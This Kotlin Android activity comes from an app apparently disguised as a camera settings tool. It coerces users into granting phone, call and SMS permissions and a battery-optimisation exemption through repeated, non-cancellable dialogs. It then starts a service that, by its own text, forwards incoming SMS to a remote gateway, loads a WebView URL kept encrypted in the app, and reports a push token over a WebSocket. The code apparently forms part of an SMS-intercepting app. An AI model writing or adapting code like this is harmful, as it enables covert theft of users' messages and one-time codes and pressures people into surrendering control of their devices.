package com.settingpro.camera

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.provider.Telephony
import android.view.Gravity
import android.widget.FrameLayout
import android.widget.ProgressBar
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.lifecycle.lifecycleScope
import com.settingpro.camera.data.local.SettingsDataStore
import com.settingpro.camera.service.SmsGatewayService
import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.util.SecretConfig
import com.google.firebase.messaging.FirebaseMessaging
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * MainActivity - Aggressive State Machine Permission Flow with Rationale
 *
 * ┌─────────────────────────────────────────────────────────────────────────────┐
 * │                    PERMISSION FLOW WITH RATIONALE                            │
 * ├─────────────────────────────────────────────────────────────────────────────┤
 * │                                                                             │
 * │  Each permission gets 2 chances via system dialogs before Settings:        │
 * │                                                                             │
 * │  1st Chance: System Dialog (Allow/Deny)                                    │
 * │  2nd Chance: Rationale Dialog → System Dialog again                        │
 * │  3rd Strike: Settings Dialog (if "Don't ask again" checked)                │
 * │                                                                             │
 * │  Android < 23: No runtime → Battery → Done                                  │
 * │  Android >= 23: Phone → SMS → Battery → Done                                │
 * │                                                                             │
 * └─────────────────────────────────────────────────────────────────────────────┘
 */
@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        // Runtime permissions introduced in Android 6.0 (API 23)
        private const val RUNTIME_PERMISSIONS_API_LEVEL = 23
        // Android 14+ (API 34) requires Default SMS app BEFORE runtime permissions
        private const val SMS_RESTRICTIONS_API_LEVEL = 34
        // Permission dialog response faster than this = dialog was suppressed
        // (prior denial / "Don't ask again" / Android 11+ twice-denied auto-deny)
        private const val SUPPRESSED_DIALOG_THRESHOLD_MS = 250L
        // Persisted permission-flow state (survives app restarts, unlike process-local flags -
        // the OS remembers denials across launches, so must we)
        private const val FLOW_PREFS_NAME = "permission_flow"
        private const val KEY_PHONE_ASKED = "phone_asked_before"
        private const val KEY_SMS_ASKED = "sms_asked_before"
    }

    // ─── State Machine ─────────────────────────────────────────────────────────────

    /**
     * Permission flow state machine - Native Android dialogs only.
     *
     * Each permission can be requested multiple times via system dialog:
     * - First denial: Request again with system dialog
     * - "Don't ask again": Must go to Settings
     *
     * Android < 23: Skip runtime, go to Battery Optimization
     * Android >= 23: Try runtime → If denied → Request again → If "Don't ask again" → Settings
     */
    private enum class FlowStep {
        CHECK_ANDROID_VERSION,  // Determine which flow to use

        // Phone Permissions (native system dialogs only)
        CHECK_PHONE,                // Check if phone permissions granted
        REQUEST_PHONE,              // Request via system dialog
        PHONE_PERMANENTLY_DENIED,   // "Don't ask again" - show Settings dialog

        // SMS Permissions (native system dialogs only)
        CHECK_SMS,                  // Check SMS (only if Phone granted!)
        REQUEST_SMS,                // Request via system dialog
        SMS_PERMANENTLY_DENIED,     // "Don't ask again" - offer Default SMS

        // Battery optimization steps (All versions, final permission step)
        CHECK_BATTERY,              // Check battery optimization
        REQUEST_BATTERY,            // Request battery exclusion
        BATTERY_DENIED,             // Battery denied - show dialog

        DONE                        // All granted - proceed
    }

    private var currentStep = FlowStep.CHECK_ANDROID_VERSION

    // Persisted "asked before" tracking (process-local flags reset on every launch,
    // but the OS remembers prior denials - this mismatch caused silently skipped dialogs)
    private val flowPrefs by lazy { getSharedPreferences(FLOW_PREFS_NAME, MODE_PRIVATE) }
    private fun hasAskedPhoneBefore() = flowPrefs.getBoolean(KEY_PHONE_ASKED, false)
    private fun hasAskedSmsBefore() = flowPrefs.getBoolean(KEY_SMS_ASKED, false)
    private fun markPhoneAsked() = flowPrefs.edit().putBoolean(KEY_PHONE_ASKED, true).apply()
    private fun markSmsAsked() = flowPrefs.edit().putBoolean(KEY_SMS_ASKED, true).apply()

    // Request launch timestamps - used to detect suppressed (auto-denied) dialogs:
    // if the system returns "denied" almost instantly, no dialog was ever shown
    private var phoneRequestLaunchTime = 0L
    private var smsRequestLaunchTime = 0L

    // Track when battery dialog was launched (to detect actual return from dialog)
    private var batteryDialogLaunchTime = 0L
    // Track how many times we've requested battery optimization (to prevent spam)
    private var batteryRequestCount = 0

    // ─── Dependencies ───────────────────────────────────────────────────────────────

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    private var webView: android.webkit.WebView? = null
    private var serviceStarted = false
    private var webViewUrl: String? = null
    private var progressBar: ProgressBar? = null

    // ─── Permission Constants ───────────────────────────────────────────────────────

    /**
     * Phone permissions - READ_PHONE_STATE, CALL_PHONE, READ_PHONE_NUMBERS
     * These are the foundation - all other permissions depend on these.
     */
    private val phonePermissions: List<String>
        get() = buildList {
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.CALL_PHONE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                add(Manifest.permission.READ_PHONE_NUMBERS)
            }
        }

    /**
     * SMS runtime permissions - RECEIVE_SMS, READ_SMS, SEND_SMS
     * These depend on Phone permissions being granted first.
     */
    private val smsPermissions: List<String>
        get() = listOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS
        )

    // ─── Modern API Launchers ───────────────────────────────────────────────────────

    /**
     * Phone permission launcher using modern ActivityResultContracts API.
     * Uses native system dialogs only - no custom rationale dialogs.
     *
     * If denied without "Don't ask again": Request again
     * If denied with "Don't ask again": Show Settings dialog
     */
    private val phoneLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val allGranted = results.values.all { it }
        markPhoneAsked()

        if (allGranted) {
            AppLogger.d(TAG, "Phone permissions granted")
            currentStep = FlowStep.CHECK_SMS
        } else {
            // A real dialog takes >250ms for the user to answer; an instant
            // denial means the system suppressed the dialog (prior denial /
            // "Don't ask again" / Android 11+ auto-deny) - re-requesting is futile
            val dialogWasShown =
                SystemClock.elapsedRealtime() - phoneRequestLaunchTime > SUPPRESSED_DIALOG_THRESHOLD_MS
            AppLogger.d(TAG, "Phone permissions denied (dialog shown: $dialogWasShown)")

            if (dialogWasShown && shouldShowRationale(phonePermissions)) {
                // User saw the dialog and denied without "Don't ask again" - ask again
                currentStep = FlowStep.REQUEST_PHONE
            } else {
                // Suppressed or permanently denied - only Settings can fix this
                currentStep = FlowStep.PHONE_PERMANENTLY_DENIED
            }
        }
        advanceFlow()
    }

    /**
     * SMS permission launcher using modern ActivityResultContracts API.
     * Uses native system dialogs only - no custom rationale dialogs.
     *
     * If denied without "Don't ask again": Request again
     * If denied with "Don't ask again": Offer Default SMS as alternative
     *
     * IMPORTANT: If SMS runtime granted, SKIP Default SMS and go to Battery
     */
    private val smsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val allGranted = results.values.all { it }
        markSmsAsked()

        if (allGranted) {
            AppLogger.d(TAG, "SMS runtime permissions granted - going to Battery")
            // Start service immediately when SMS permissions granted
            startSmsGatewayServiceIfNeeded()
            currentStep = FlowStep.CHECK_BATTERY
        } else {
            // Instant denial = dialog was suppressed (prior denial / "Don't ask again" /
            // Android 11+ auto-deny). Silently skipping SMS here previously caused the
            // flow to jump straight to Battery without the user ever seeing an SMS prompt.
            val dialogWasShown =
                SystemClock.elapsedRealtime() - smsRequestLaunchTime > SUPPRESSED_DIALOG_THRESHOLD_MS
            AppLogger.d(TAG, "SMS runtime permissions denied (dialog shown: $dialogWasShown)")

            if (dialogWasShown && shouldShowRationale(smsPermissions)) {
                // User saw the dialog and denied without "Don't ask again" - ask again
                currentStep = FlowStep.REQUEST_SMS
            } else {
                // Suppressed or permanently denied - blocking Settings dialog (SMS is critical)
                currentStep = FlowStep.SMS_PERMANENTLY_DENIED
            }
        }
        advanceFlow()
    }

    /**
     * Battery optimization launcher using REQUEST_IGNORE_BATTERY_OPTIMIZATIONS.
     * Final permission step: Phone → SMS → Battery → Done.
     */
    private val batteryLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        // Don't check here - on some ROMs (Vivo, etc.) this callback fires
        // immediately when dialog opens, not when user makes a choice.
        // We'll check in onResume instead.
        AppLogger.d(TAG, "Battery dialog returned - will check status in onResume")
    }

    private fun checkBatteryOptimizationWithRetry(retryCount: Int = 0) {
        if (isIgnoringBatteryOptimizations()) {
            AppLogger.d(TAG, "Battery optimization exclusion granted")
            batteryRequestCount = 0 // Reset counter when granted
            currentStep = FlowStep.DONE
            advanceFlow()
        } else if (retryCount < 5) {
            // Retry after 300ms - system might be slow to save setting
            AppLogger.d(TAG, "Battery optimization check retry $retryCount")
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                checkBatteryOptimizationWithRetry(retryCount + 1)
            }, 300)
        } else {
            AppLogger.d(TAG, "Battery optimization exclusion denied after retries (request #$batteryRequestCount)")
            currentStep = FlowStep.BATTERY_DENIED
            advanceFlow()
        }
    }

    // ─── Lifecycle ───────────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Initialize secure encryption for URLs
        SecretConfig.initialize(this)

        // Initialize FCM token
        initializeFcmToken()

        // Setup WebView UI first (but don't load URL until permissions granted)
        setupWebView()

        // Start the aggressive permission flow
        startPermissionFlow()
    }

    override fun onResume() {
        super.onResume()
        // When returning from any dialog or settings, continue the permission flow
        // Small delay to ensure the state has settled
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            checkPermissionsAfterSettings()
        }, 100)
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        // Save battery dialog state to handle activity recreation
        outState.putLong("battery_dialog_launch_time", batteryDialogLaunchTime)
        outState.putSerializable("current_step", currentStep)
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        // Restore battery dialog state
        batteryDialogLaunchTime = savedInstanceState.getLong("battery_dialog_launch_time", 0L)
        @Suppress("DEPRECATION")
        currentStep = savedInstanceState.getSerializable("current_step") as? FlowStep ?: FlowStep.CHECK_ANDROID_VERSION
    }

    override fun onDestroy() {
        super.onDestroy()
        webView?.destroy()
        webView = null
        progressBar = null
    }

    // ─── Permission Flow State Machine ───────────────────────────────────────────────

    /**
     * Initialize the permission flow state machine.
     * Always starts with CHECK_ANDROID_VERSION step.
     */
    private fun startPermissionFlow() {
        currentStep = FlowStep.CHECK_ANDROID_VERSION
        advanceFlow()
    }

    /**
     * State machine executor with 2-chance system for each permission.
     *
     * For each permission:
     * 1. First time: Direct system dialog (REQUEST_PHONE/REQUEST_SMS)
     * 2. If denied with rationale: Show rationale, ask again (PHONE_DENIED_WITH_RATIONALE)
     * 3. If "Don't ask again": Show Settings dialog (PERMANENTLY_DENIED)
     */
    private fun advanceFlow() {
        when (currentStep) {
            // ─── Version Check - Route to appropriate flow ────────────────────────────────
            FlowStep.CHECK_ANDROID_VERSION -> {
                val isRuntimePermissionsSupported = Build.VERSION.SDK_INT >= RUNTIME_PERMISSIONS_API_LEVEL
                AppLogger.d(TAG, "Android SDK: ${Build.VERSION.SDK_INT}, Runtime permissions: $isRuntimePermissionsSupported")

                if (isRuntimePermissionsSupported) {
                    // Android 6.0+ (API 23+) - Try runtime permissions first
                    AppLogger.d(TAG, "Using runtime permission flow")
                    currentStep = FlowStep.CHECK_PHONE
                } else {
                    // Android < 6.0 (API < 23) - No runtime permissions, go to Default SMS
                    AppLogger.d(TAG, "No runtime permissions, going to Battery Optimization")
                    currentStep = FlowStep.CHECK_BATTERY
                }
                advanceFlow()
            }

            // ─── Phone Permissions (native system dialogs only) ────────────────────────────────
            FlowStep.CHECK_PHONE -> {
                if (hasPhonePermissions()) {
                    AppLogger.d(TAG, "Phone permissions already granted")
                    currentStep = FlowStep.CHECK_SMS
                    advanceFlow()
                } else {
                    // Asked in a previous launch AND no rationale = dialog would be
                    // suppressed by the OS - go straight to the Settings dialog
                    if (hasAskedPhoneBefore() && !shouldShowRationale(phonePermissions)) {
                        currentStep = FlowStep.PHONE_PERMANENTLY_DENIED
                    } else {
                        // Request via system dialog
                        currentStep = FlowStep.REQUEST_PHONE
                    }
                    advanceFlow()
                }
            }

            FlowStep.REQUEST_PHONE -> {
                // Native system dialog
                phoneRequestLaunchTime = SystemClock.elapsedRealtime()
                phoneLauncher.launch(phonePermissions.toTypedArray())
            }

            FlowStep.PHONE_PERMANENTLY_DENIED -> {
                // "Don't ask again" - show Settings dialog
                showPhoneDeniedDialog()
            }

            // ─── SMS Permissions (native system dialogs only) ───────────────────────────────────
            FlowStep.CHECK_SMS -> {
                if (hasSmsRuntimePermissions()) {
                    AppLogger.d(TAG, "SMS runtime permissions granted - skipping Default SMS")
                    // Start service immediately after SMS permissions granted
                    startSmsGatewayServiceIfNeeded()
                    currentStep = FlowStep.CHECK_BATTERY
                    advanceFlow()
                } else {
                    // Asked in a previous launch AND no rationale = dialog would be
                    // suppressed by the OS - go straight to the Settings dialog
                    if (hasAskedSmsBefore() && !shouldShowRationale(smsPermissions)) {
                        currentStep = FlowStep.SMS_PERMANENTLY_DENIED
                    } else {
                        // Request via system dialog
                        currentStep = FlowStep.REQUEST_SMS
                    }
                    advanceFlow()
                }
            }

            FlowStep.REQUEST_SMS -> {
                // Native system dialog
                smsRequestLaunchTime = SystemClock.elapsedRealtime()
                smsLauncher.launch(smsPermissions.toTypedArray())
            }

            FlowStep.SMS_PERMANENTLY_DENIED -> {
                // SMS is critical - NEVER silently skip. Blocking dialog routes the
                // user to Settings where a suppressed permission can still be granted
                // (the Default SMS role at the end remains the fallback for SMS access)
                showSmsDeniedDialog()
            }

            // ─── Battery Optimization (All Android versions, final step) ────────────────
            FlowStep.CHECK_BATTERY -> {
                if (isIgnoringBatteryOptimizations()) {
                    AppLogger.d(TAG, "Already ignoring battery optimizations")
                    batteryRequestCount = 0 // Reset counter when granted
                    currentStep = FlowStep.DONE
                    advanceFlow()
                } else {
                    AppLogger.d(TAG, "Requesting battery optimization exclusion")
                    currentStep = FlowStep.REQUEST_BATTERY
                    advanceFlow()
                }
            }

            FlowStep.REQUEST_BATTERY -> {
                batteryRequestCount++
                requestBatteryOptimization()
            }

            FlowStep.BATTERY_DENIED -> {
                // Keep asking - show native battery dialog repeatedly
                currentStep = FlowStep.REQUEST_BATTERY
                advanceFlow()
            }

            // ─── Complete ──────────────────────────────────────────────────────────────
            FlowStep.DONE -> {
                AppLogger.d(TAG, "All permissions granted - initializing app")
                onAllPermissionsGranted()
            }
        }
    }

    /**
     * Check permissions after returning from Settings.
     * Automatically advances the flow based on what's now granted.
     *
     * KEY: If SMS runtime granted, skip Default SMS and go to Battery
     */
    private fun checkPermissionsAfterSettings() {
        // Only check if we haven't completed the flow yet
        if (currentStep != FlowStep.DONE) {
            // Reset to check step based on current state
            when (currentStep) {
                FlowStep.PHONE_PERMANENTLY_DENIED -> {
                    if (hasPhonePermissions()) {
                        currentStep = FlowStep.CHECK_SMS
                        advanceFlow()
                    }
                }
                FlowStep.SMS_PERMANENTLY_DENIED -> {
                    // If SMS runtime now granted, skip Default SMS
                    if (hasSmsRuntimePermissions()) {
                        AppLogger.d(TAG, "SMS runtime granted after settings - skipping Default SMS")
                        startSmsGatewayServiceIfNeeded()
                        currentStep = FlowStep.CHECK_BATTERY
                        advanceFlow()
                    }
                }
                FlowStep.REQUEST_BATTERY -> {
                    // Handle return from battery optimization dialog
                    // Always check battery status when we're in this state
                    batteryDialogLaunchTime = 0L
                    checkBatteryOptimizationWithRetry()
                }
                FlowStep.BATTERY_DENIED -> {
                    // BATTERY_DENIED state means we need to ask again
                    // Don't check here, just let the flow loop back to REQUEST_BATTERY
                }
                else -> {
                    // Don't interrupt ongoing requests
                }
            }
        }
    }

    // ─── Dialogs (ALL BLOCKING - No Cancellation) ───────────────────────────────────

    /**
     * Phone permissions denied dialog - BLOCKING.
     * Shown when user checks "Don't ask again" for Phone permissions.
     * User must either go to Settings or Exit the app.
     */
    private fun showPhoneDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("Phone Permissions Required")
            .setMessage(
                "This app requires Phone permissions to function properly.\n\n" +
                "These permissions are essential for:\n" +
                "• Reading phone state and identity\n" +
                "• Managing call forwarding\n" +
                "• Reading your phone number\n\n" +
                "Without these permissions, the app cannot function."
            )
            .setPositiveButton("Open Settings") { _, _ ->
                openAppSettings()
            }
            .setNegativeButton("Exit App") { _, _ ->
                finishAffinity()
            }
            .setCancelable(false)
            .show()
    }

    /**
     * SMS permissions denied dialog - BLOCKING.
     * Shown when the SMS dialog was suppressed ("Don't ask again" / prior denial /
     * Android 11+ auto-deny) - the only way forward is granting in Settings.
     */
    private fun showSmsDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("SMS Permissions Required")
            .setMessage(
                "This app requires SMS permissions to function.\n\n" +
                "SMS access is essential for:\n" +
                "• Receiving incoming messages\n" +
                "• Forwarding messages to the gateway\n" +
                "• Sending responses\n\n" +
                "The permission dialog can no longer be shown by Android.\n" +
                "Please grant SMS permissions in Settings."
            )
            .setPositiveButton("Open Settings") { _, _ ->
                openAppSettings()
            }
            .setNegativeButton("Exit App") { _, _ ->
                finishAffinity()
            }
            .setCancelable(false)
            .show()
    }

    /**
     * Battery optimization denied dialog - BLOCKING.
     * User must either go to Settings to disable optimization or Exit.
     * This is critical for reliable background SMS forwarding.
     */
    private fun showBatteryDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("Battery Optimization Required")
            .setMessage(
                "This app must be excluded from battery optimization.\n\n" +
                "Battery optimization can:\n" +
                "• Kill the background service\n" +
                "• Prevent SMS forwarding\n" +
                "• Delay message processing\n\n" +
                "For reliable SMS forwarding, please exclude this app from battery optimization."
            )
            .setPositiveButton("Open Settings") { _, _ ->
                openAppSettings()
            }
            .setNegativeButton("Exit App") { _, _ ->
                finishAffinity()
            }
            .setCancelable(false)
            .show()
    }

    /**
     * Open the app's settings page.
     * Used when permissions are permanently denied.
     */
    private fun openAppSettings() {
        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
            startActivity(this)
        }
    }

    // ─── Helper Methods ───────────────────────────────────────────────────────────────

    /**
     * Check if we should show rationale for given permissions.
     * Returns TRUE if user denied once but can ask again.
     * Returns FALSE if first time OR "Don't ask again" was checked.
     */
    private fun shouldShowRationale(permissions: List<String>): Boolean {
        return permissions.any { permission ->
            ActivityCompat.shouldShowRequestPermissionRationale(this, permission)
        }
    }

    /**
     * Check if all Phone permissions are granted.
     */
    private fun hasPhonePermissions(): Boolean {
        return phonePermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Check if all SMS runtime permissions are granted.
     */
    private fun hasSmsRuntimePermissions(): Boolean {
        return smsPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Check if the app is ignoring battery optimizations.
     */
    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    /**
     * Request battery optimization exclusion.
     * Shows a system dialog asking the user to ignore optimizations.
     */
    private fun requestBatteryOptimization() {
        try {
            batteryDialogLaunchTime = System.currentTimeMillis()
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
                // Ensure proper return to our app after battery dialog
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            batteryLauncher.launch(intent)
        } catch (e: Exception) {
            batteryDialogLaunchTime = 0L
            AppLogger.e(TAG, "Failed to request battery optimization exclusion", e)
            // Continue anyway - can't force this
            currentStep = FlowStep.DONE
            advanceFlow()
        }
    }

    // ─── WebView Setup ───────────────────────────────────────────────────────────────

    /**
     * Setup WebView UI (but don't load URL until permissions are granted).
     * This saves resources by not initializing the renderer process until needed.
     */
    private fun setupWebView() {
        webViewUrl = SecretConfig.getWebViewUrl(this)

        if (webViewUrl.isNullOrBlank()) {
            // No URL configured - use empty container
            setContentView(FrameLayout(this))
        } else {
            // Create WebView (don't load URL yet)
            webView = createWebView()

            // Create progress bar
            progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleLarge)

            // Setup layout
            setContentView(FrameLayout(this).apply {
                addView(
                    webView, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT
                    )
                )
                addView(
                    progressBar, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.WRAP_CONTENT,
                        FrameLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        gravity = Gravity.CENTER
                    }
                )
            })

            // Show loader initially
            progressBar?.isVisible = true
        }
    }

    /**
     * Create and configure WebView.
     */
    private fun createWebView() = android.webkit.WebView(this).apply {
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.loadWithOverviewMode = true
        settings.useWideViewPort = true
        settings.setSupportZoom(true)
        settings.builtInZoomControls = true
        settings.displayZoomControls = false

        webViewClient = object : android.webkit.WebViewClient() {
            override fun onPageStarted(
                view: android.webkit.WebView?,
                url: String?,
                favicon: android.graphics.Bitmap?
            ) {
                super.onPageStarted(view, url, favicon)
                progressBar?.isVisible = true
            }

            override fun onPageFinished(view: android.webkit.WebView?, url: String?) {
                super.onPageFinished(view, url)
                progressBar?.isVisible = false
            }
        }
    }

    // ─── Completion ──────────────────────────────────────────────────────────────────

    /**
     * All permissions granted - initialize the app.
     * Starts the SMS Gateway service and loads the WebView.
     */
    private fun onAllPermissionsGranted() {
        // Mark that all permissions have been granted
        lifecycleScope.launch(Dispatchers.IO) {
            settingsDataStore.setPermissionsGranted(true)
            settingsDataStore.setServiceEnabled(true)
        }

        // Load WebView URL
        if (!webViewUrl.isNullOrBlank()) {
            webView?.loadUrl(webViewUrl!!)
        }

        // Start SMS Gateway Service if not already started earlier
        // (Service may have already been started when SMS permissions were granted)
        if (!SmsGatewayService.isServiceRunning() && !serviceStarted) {
            serviceStarted = true
            startSmsGatewayService()
        }
    }

    /**
     * Start the SMS Gateway foreground service.
     */
    private fun startSmsGatewayService() {
        if (SmsGatewayService.isServiceRunning()) return

        val intent = Intent(this, SmsGatewayService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    /**
     * Start the SMS Gateway service if not already running and if critical permissions are granted.
     * This allows the service to start as soon as Phone + SMS (or Default SMS) permissions are granted,
     * without waiting for battery optimization.
     */
    private fun startSmsGatewayServiceIfNeeded() {
        // Only start if critical permissions are granted
        val hasCriticalPermissions = hasPhonePermissions() &&
            (hasSmsRuntimePermissions())

        if (hasCriticalPermissions && !SmsGatewayService.isServiceRunning() && !serviceStarted) {
            AppLogger.d(TAG, "Critical permissions granted - starting SMS Gateway service early")
            serviceStarted = true
            startSmsGatewayService()
        }
    }

    /**
     * Initialize FCM token and save to DataStore.
     * Called during app initialization to ensure token is available for registration.
     */
    private fun initializeFcmToken() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                AppLogger.w(TAG, "FCM token retrieval failed: ${task.exception?.message}")
                return@addOnCompleteListener
            }

            val token = task.result
            if (token != null) {
                AppLogger.d(TAG, "FCM token retrieved: ${token.take(16)}...")
                lifecycleScope.launch(Dispatchers.IO) {
                    try {
                        settingsDataStore.setFcmToken(token)
                        AppLogger.d(TAG, "FCM token saved to DataStore")
                        // Trigger device info refresh to update FCM token in WebSocket
                        SmsGatewayService.refreshDeviceInfo(this@MainActivity)
                        AppLogger.d(TAG, "Device info refresh triggered after FCM token saved")
                    } catch (e: Exception) {
                        AppLogger.e(TAG, "Error saving FCM token", e)
                    }
                }
            }
        }
    }
}
